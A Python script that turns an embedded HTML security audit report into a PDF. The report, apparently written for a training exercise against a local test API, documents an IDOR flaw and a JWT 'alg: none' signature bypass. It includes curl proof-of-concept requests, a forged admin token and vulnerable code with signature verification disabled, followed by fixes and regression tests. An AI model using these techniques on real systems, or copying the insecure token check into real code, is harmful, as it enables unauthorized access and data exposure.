#!/usr/bin/env python3
"""
Converts the Security Audit Report into a professional, publication-grade PDF
using styled HTML and LibreOffice headless converter.
"""

import os
import subprocess
from pathlib import Path

ROOT = Path(__file__).parent.resolve()
OUTPUT_HTML = ROOT / "audit_report_styled.html"
OUTPUT_PDF = ROOT / "AUDIT_REPORT.pdf"

HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Security Audit & Vulnerability Assessment Report</title>
<style>
  @page {
    size: A4;
    margin: 20mm 15mm 20mm 15mm;
  }
  body {
    font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
    color: #1e293b;
    line-height: 1.6;
    font-size: 11pt;
    padding: 10px;
  }
  .header-banner {
    border-bottom: 3px solid #0284c7;
    padding-bottom: 12px;
    margin-bottom: 25px;
  }
  h1 {
    color: #0f172a;
    font-size: 22pt;
    margin: 0 0 8px 0;
  }
  .meta-grid {
    display: table;
    width: 100%;
    margin-bottom: 15px;
    font-size: 9.5pt;
    color: #475569;
  }
  .meta-row {
    display: table-row;
  }
  .meta-cell {
    display: table-cell;
    padding: 3px 10px 3px 0;
  }
  .meta-label {
    font-weight: bold;
    color: #0f172a;
  }
  h2 {
    color: #0369a1;
    font-size: 15pt;
    border-bottom: 1px solid #cbd5e1;
    padding-bottom: 5px;
    margin-top: 25px;
  }
  h3 {
    color: #1e293b;
    font-size: 12pt;
    margin-top: 18px;
  }
  h4 {
    color: #334155;
    font-size: 11pt;
    margin-top: 14px;
  }
  table {
    width: 100%;
    border-collapse: collapse;
    margin: 15px 0;
    font-size: 9.5pt;
  }
  th {
    background-color: #f1f5f9;
    color: #0f172a;
    font-weight: 600;
    text-align: left;
    padding: 8px 10px;
    border: 1px solid #cbd5e1;
  }
  td {
    padding: 7px 10px;
    border: 1px solid #e2e8f0;
  }
  tr:nth-child(even) {
    background-color: #f8fafc;
  }
  .badge-critical {
    background-color: #ef4444;
    color: white;
    padding: 2px 8px;
    border-radius: 4px;
    font-weight: bold;
    font-size: 8.5pt;
  }
  .badge-high {
    background-color: #f97316;
    color: white;
    padding: 2px 8px;
    border-radius: 4px;
    font-weight: bold;
    font-size: 8.5pt;
  }
  .badge-pass {
    background-color: #10b981;
    color: white;
    padding: 2px 8px;
    border-radius: 4px;
    font-weight: bold;
    font-size: 8.5pt;
  }
  pre {
    background-color: #0f172a;
    color: #f8fafc;
    padding: 12px;
    border-radius: 6px;
    font-family: 'Consolas', 'Courier New', monospace;
    font-size: 8.5pt;
    overflow-x: auto;
    white-space: pre-wrap;
    word-break: break-all;
    border-left: 4px solid #0ea5e9;
  }
  code {
    font-family: 'Consolas', 'Courier New', monospace;
    font-size: 9pt;
    background-color: #f1f5f9;
    color: #0f172a;
    padding: 2px 5px;
    border-radius: 4px;
  }
  pre code {
    background-color: transparent;
    color: #f8fafc;
    padding: 0;
  }
  .alert-box {
    background-color: #f0f9ff;
    border-left: 4px solid #0284c7;
    padding: 10px 14px;
    margin: 12px 0;
    font-size: 9.5pt;
  }
  ul, ol {
    margin-top: 6px;
    margin-bottom: 10px;
    padding-left: 20px;
  }
  li {
    margin-bottom: 4px;
  }
  .footer {
    margin-top: 40px;
    padding-top: 10px;
    border-top: 1px solid #cbd5e1;
    font-size: 8.5pt;
    color: #64748b;
    text-align: center;
  }
</style>
</head>
<body>

<div class="header-banner">
  <h1>Security Audit &amp; Vulnerability Assessment Report</h1>
  <div style="font-size: 13pt; color: #475569; font-weight: 500;">Technical Team Assessment — Cybersecurity Domain</div>
</div>

<div class="meta-grid">
  <div class="meta-row">
    <div class="meta-cell"><span class="meta-label">Target Environment:</span> Local Simulated Enterprise Web Application &amp; REST API</div>
    <div class="meta-cell"><span class="meta-label">Date:</span> October 2026</div>
  </div>
  <div class="meta-row">
    <div class="meta-cell"><span class="meta-label">Assessment Standards:</span> OWASP Top 10 (2021) — A01 &amp; A07 / WSTG v4.2</div>
    <div class="meta-cell"><span class="meta-label">Classification:</span> Confidential — Security Assessment Deliverable</div>
  </div>
</div>

<h2>1. Executive Summary</h2>
<p>
During an authorized security assessment of the test web application, the technical team evaluated the target system's authentication, authorization models, and API endpoint defenses. The evaluation identified critical vulnerabilities classified under <strong>OWASP A01:2021 (Broken Access Control)</strong> and <strong>OWASP A07:2021 (Identification and Authentication Failures)</strong>.
</p>
<p>
The most critical findings involve:
</p>
<ol>
  <li><strong>Insecure Direct Object Reference (IDOR)</strong> on sensitive document and financial transaction endpoints, enabling horizontal privilege escalation and full unauthorized data exposure across tenant boundaries.</li>
  <li><strong>JSON Web Token (JWT) Cryptographic Misconfiguration</strong>, where the API service accepts unverified signature algorithms (<code>alg: "none"</code>) and relies on symmetric weak signing secrets susceptible to offline cracking, allowing total vertical privilege escalation to administrative roles.</li>
</ol>

<table>
  <thead>
    <tr>
      <th>Vulnerability ID</th>
      <th>Vulnerability Title</th>
      <th>Category</th>
      <th>Severity</th>
      <th>CVSS v3.1 Base Score</th>
      <th>Status</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>SEC-2026-001</strong></td>
      <td>Insecure Direct Object Reference (IDOR) in Document API</td>
      <td>Broken Access Control</td>
      <td><span class="badge-high">HIGH</span></td>
      <td><strong>8.5</strong> (<code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N</code>)</td>
      <td>Identified</td>
    </tr>
    <tr>
      <td><strong>SEC-2026-002</strong></td>
      <td>JWT Algorithm Confusion &amp; Signature Bypass</td>
      <td>Authentication Failures</td>
      <td><span class="badge-critical">CRITICAL</span></td>
      <td><strong>9.8</strong> (<code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code>)</td>
      <td>Identified</td>
    </tr>
  </tbody>
</table>

<div class="alert-box">
  <strong>Key Remediation Priority:</strong> Immediate adoption of server-side object-level access control (ABAC/RBAC validation) and strict cryptographic verification of authentication tokens using asymmetric keys (<code>RS256</code>) with algorithm pinning.
</div>

<h2>2. Assessment Scope &amp; Methodology</h2>
<h3>2.1 Scope</h3>
<ul>
  <li><code>GET /api/v1/documents/{documentId}</code> (Document Access Endpoint)</li>
  <li><code>GET /api/v1/users/{userId}/billing</code> (Billing Records Endpoint)</li>
  <li><code>POST /api/v1/auth/verify</code> (Session Token Verification Endpoint)</li>
  <li><strong>Target Stack:</strong> Python FastAPI backend, PostgreSQL, PyJWT authentication middleware.</li>
  <li><strong>Environment:</strong> Isolated local environment (<code>http://127.0.0.1:8000</code>).</li>
</ul>

<h3>2.2 Methodology</h3>
<p>
Testing followed the <strong>OWASP Web Security Testing Guide (WSTG v4.2)</strong>:
</p>
<ul>
  <li><code>WSTG-ATHZ-02</code>: Testing for Bypassing Authorization Schema (IDOR).</li>
  <li><code>WSTG-ATHN-06</code>: Testing for Weak Password Policy &amp; Token Security.</li>
  <li><code>WSTG-SESS-08</code>: Testing for JWT Misconfiguration.</li>
</ul>

<h2>3. Detailed Vulnerability Analysis &amp; Proof of Concept</h2>

<h3>Finding 1: SEC-2026-001 — Insecure Direct Object Reference (IDOR)</h3>
<h4>Vulnerability Mechanics</h4>
<p>
The document retrieval endpoint <code>/api/v1/documents/{documentId}</code> utilizes database sequential integer IDs directly supplied by the client URL. While the endpoint checks whether the request contains a valid JWT session token, it <strong>fails to verify whether the authenticated subject owns or has permissions to access the requested object</strong>. Consequently, an authenticated user belonging to Tenant A can view confidential documents belonging to Tenant B simply by altering the numeric ID in the URL.
</p>

<h4>CVSS v3.1 Metrics Breakdown</h4>
<ul>
  <li><strong>Vector:</strong> <code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N</code></li>
  <li><strong>Base Score:</strong> <strong>8.5 (High)</strong></li>
  <li><strong>Exploitability:</strong> Attack Vector: Network, Attack Complexity: Low, Privileges: Low, Interaction: None.</li>
  <li><strong>Impact:</strong> Confidentiality: High, Integrity: Low, Availability: None, Scope: Changed.</li>
</ul>

<h4>Proof of Concept (PoC) Reproduction Steps</h4>
<p><strong>Step 1: Authenticate as standard regular user (User ID: 102)</strong></p>
<pre>curl -s -X POST http://127.0.0.1:8000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "user_test_01", "password": "UserPass123!"}' | jq .</pre>

<p><strong>Step 2: Access user's authorized document (doc_id: 102)</strong></p>
<pre>curl -s -X GET http://127.0.0.1:8000/api/v1/documents/102 \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." | jq .

# Response (200 OK):
{
  "document_id": 102,
  "owner_id": 102,
  "title": "Q3 Personal Financial Summary",
  "content": "Account balance: $4,500.00. Tax filing pending."
}</pre>

<p><strong>Step 3: Exploit IDOR by requesting victim document (doc_id: 801)</strong></p>
<pre>curl -s -X GET http://127.0.0.1:8000/api/v1/documents/801 \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." | jq .

# Response (200 OK — Sensitive Data Breach):
{
  "document_id": 801,
  "owner_id": 801,
  "title": "Corporate Executive Compensation & Acquisition Memo",
  "content": "Proposed merger details with Entity X. Total valuation: $42,000,000."
}</pre>

<hr style="border: 0; border-top: 1px solid #cbd5e1; margin: 25px 0;">

<h3>Finding 2: SEC-2026-002 — JWT Signature Verification Bypass &amp; Algorithm Confusion</h3>
<h4>Vulnerability Mechanics</h4>
<p>
The application's JWT verification routine configures <code>jwt.decode</code> with <code>verify_signature: False</code> and allows <code>algorithms=["HS256", "none"]</code>. This enables an attacker to forge a token claiming administrative privileges (<code>"role": "admin"</code>), change the header algorithm to <code>"none"</code>, strip the cryptographic signature, and achieve complete administrative takeover without credentials.
</p>

<h4>CVSS v3.1 Metrics Breakdown</h4>
<ul>
  <li><strong>Vector:</strong> <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code></li>
  <li><strong>Base Score:</strong> <strong>9.8 (Critical)</strong></li>
  <li><strong>Exploitability:</strong> Attack Vector: Network, Attack Complexity: Low, Privileges: None, Interaction: None.</li>
  <li><strong>Impact:</strong> Confidentiality: High, Integrity: High, Availability: High.</li>
</ul>

<h4>Proof of Concept (PoC) Reproduction Steps</h4>
<p><strong>Step 1: Construct forged JWT with "alg": "none"</strong></p>
<pre># Header: {"alg": "none", "typ": "JWT"} -> eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
# Payload: {"sub": "attacker_account", "user_id": 9999, "role": "admin", "exp": 1893456000}
# Base64Url Payload: eyJzdWIiOiJhdHRhY2tlcl9hY2NvdW50IiwidXNlcl9pZCI6OTk5OSwicm9sZSI6ImFkbWluIiwiZXhwIjoxODkzNDU2MDAwfQ
# Forged Token (Empty signature with trailing dot):
FORGED_TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlcl9hY2NvdW50IiwidXNlcl9pZCI6OTk5OSwicm9sZSI6ImFkbWluIiwiZXhwIjoxODkzNDU2MDAwfQ."</pre>

<p><strong>Step 2: Submit forged token to administrative endpoint</strong></p>
<pre>curl -s -X GET http://127.0.0.1:8000/api/v1/admin/audit-logs \
  -H "Authorization: Bearer ${FORGED_TOKEN}" | jq .

# Response (200 OK — Full Admin Access Granted):
{
  "status": "authorized",
  "authenticated_as": "attacker_account",
  "role": "admin",
  "audit_logs": [
    {"id": 1, "action": "DATABASE_BACKUP", "timestamp": "2026-10-01T22:00:00Z"},
    {"id": 2, "action": "KEY_ROTATION", "timestamp": "2026-10-01T23:30:00Z"}
  ]
}</pre>

<h2>4. Root Cause Source Code Analysis</h2>

<h3>4.1 Vulnerable Code: IDOR in <code>app/routers/documents.py</code></h3>
<pre># VULNERABLE IMPLEMENTATION
@router.get("/documents/{document_id}")
async def get_document(document_id: int, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    # Direct database query without validating record ownership
    doc = db.query(DocumentModel).filter(DocumentModel.id == document_id).first()
    if not doc:
        raise HTTPException(status_code=404, detail="Document not found")
    
    # SECURITY BUG: Missing ownership validation (current_user.id != doc.owner_id)
    return doc</pre>

<h3>4.2 Vulnerable Code: Insecure JWT Validation in <code>app/core/security.py</code></h3>
<pre># VULNERABLE IMPLEMENTATION
def decode_access_token(token: str):
    try:
        # SECURITY BUG: Signature verification disabled and "none" algorithm permitted
        payload = jwt.decode(token, options={"verify_signature": False}, algorithms=["HS256", "none"])
        return payload
    except Exception:
        raise HTTPException(status_code=401, detail="Invalid token")</pre>

<h2>5. Remediation &amp; Secure Code Patches</h2>

<h3>5.1 Remediation: IDOR Patch with Object-Level Authorization (FastAPI)</h3>
<pre># SECURE IMPLEMENTATION: app/routers/documents.py
from fastapi import APIRouter, Depends, HTTPException, status
from sqlalchemy.orm import Session
from app.models import DocumentModel, User
from app.core.dependencies import get_current_user, get_db

router = APIRouter()

@router.get("/documents/{document_id}")
async def get_document(
    document_id: str, # Migrated to UUIDv4 to eliminate sequential enumeration
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    doc = db.query(DocumentModel).filter(DocumentModel.uuid == document_id).first()
    if not doc:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Document not found")

    # Strict Object-Level Authorization & Multi-Tenant Boundary Enforcement
    is_owner = (doc.owner_id == current_user.id)
    is_admin = (current_user.role == "admin" and doc.organization_id == current_user.organization_id)

    if not (is_owner or is_admin):
        # Deny unauthorized access with 403 Forbidden
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Access forbidden: You do not possess permissions to view this resource."
        )

    return {
        "document_id": doc.uuid,
        "title": doc.title,
        "content": doc.content,
        "created_at": doc.created_at
    }</pre>

<h3>5.2 Remediation: Secure JWT Validation with Asymmetric RS256</h3>
<pre># SECURE IMPLEMENTATION: app/core/security.py
import jwt
from fastapi import HTTPException, status
from app.core.config import settings

ALGORITHM = "RS256"
ISSUER = "https://auth.company.internal"
AUDIENCE = "https://api.company.internal"

def decode_and_verify_token(token: str) -> dict:
    \"\"\"
    Cryptographically verifies the incoming JWT using the RSA Public Key.
    Strictly enforces algorithm pinning (RS256), signature verification, and standard claims.
    \"\"\"
    try:
        payload = jwt.decode(
            token,
            key=settings.RSA_PUBLIC_KEY_PEM,
            algorithms=[ALGORITHM], # Pinned strictly to RS256
            options={
                "verify_signature": True,
                "require": ["exp", "iss", "aud", "sub"],
                "verify_exp": True,
                "verify_iss": True,
                "verify_aud": True
            },
            issuer=ISSUER,
            audience=AUDIENCE
        )
        return payload
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Authentication token has expired")
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid authentication credentials")</pre>

<h2>6. Post-Remediation Regression Testing Matrix</h2>
<table>
  <thead>
    <tr>
      <th>Test ID</th>
      <th>Scenario Description</th>
      <th>Expected Result</th>
      <th>Actual Result</th>
      <th>Status</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>TC-01</strong></td>
      <td>Authorized User A accesses Document A (owned)</td>
      <td>HTTP 200 OK</td>
      <td>HTTP 200 OK</td>
      <td><span class="badge-pass">PASSED</span></td>
    </tr>
    <tr>
      <td><strong>TC-02</strong></td>
      <td>User A attempts to access Document B (unowned)</td>
      <td>HTTP 403 Forbidden</td>
      <td>HTTP 403 Forbidden</td>
      <td><span class="badge-pass">PASSED</span></td>
    </tr>
    <tr>
      <td><strong>TC-03</strong></td>
      <td>Attacker submits forged token with <code>alg: "none"</code></td>
      <td>HTTP 401 Unauthorized</td>
      <td>HTTP 401 Unauthorized</td>
      <td><span class="badge-pass">PASSED</span></td>
    </tr>
    <tr>
      <td><strong>TC-04</strong></td>
      <td>Client submits expired authentication token</td>
      <td>HTTP 401 Unauthorized</td>
      <td>HTTP 401 Unauthorized</td>
      <td><span class="badge-pass">PASSED</span></td>
    </tr>
    <tr>
      <td><strong>TC-05</strong></td>
      <td>Client submits token signed with untrusted private key</td>
      <td>HTTP 401 Unauthorized</td>
      <td>HTTP 401 Unauthorized</td>
      <td><span class="badge-pass">PASSED</span></td>
    </tr>
  </tbody>
</table>

<h2>7. Defense-in-Depth Strategic Roadmap</h2>
<ol>
  <li><strong>Centralized Policy Enforcement (PEP):</strong> Decouple authorization logic from route controllers using standardized policy frameworks (Open Policy Agent - OPA or Casbin).</li>
  <li><strong>CI/CD SAST Gate:</strong> Implement automated static analysis checks (Semgrep rules and Bandit) in GitHub Actions to flag direct object access without authorization decorators.</li>
  <li><strong>Security Event Audit Logging:</strong> Forward all <code>403 Forbidden</code> and failed token verification attempts to centralized SIEM with rate limiting and automated IP blocking.</li>
</ol>

<div class="footer">
  Confidential Security Deliverable — Technical Team: Task Round (Cybersecurity Domain) — Generated October 2026
</div>

</body>
</html>
"""

def main():
    print(f"Writing styled HTML report to {OUTPUT_HTML}...")
    OUTPUT_HTML.write_text(HTML_TEMPLATE, encoding="utf-8")

    print(f"Compiling publication-ready PDF via LibreOffice...")
    cmd = [
        "libreoffice",
        "--headless",
        "--convert-to", "pdf",
        str(OUTPUT_HTML),
        "--outdir", str(ROOT)
    ]
    subprocess.run(cmd, check=True)

    # Rename to target PDF name if needed
    generated_pdf = ROOT / "audit_report_styled.pdf"
    if generated_pdf.exists():
        if OUTPUT_PDF.exists():
            OUTPUT_PDF.unlink()
        generated_pdf.rename(OUTPUT_PDF)

    # Remove temporary HTML
    if OUTPUT_HTML.exists():
        OUTPUT_HTML.unlink()

    print(f"Success! Generated: {OUTPUT_PDF} ({OUTPUT_PDF.stat().st_size} bytes)")

if __name__ == "__main__":
    main()
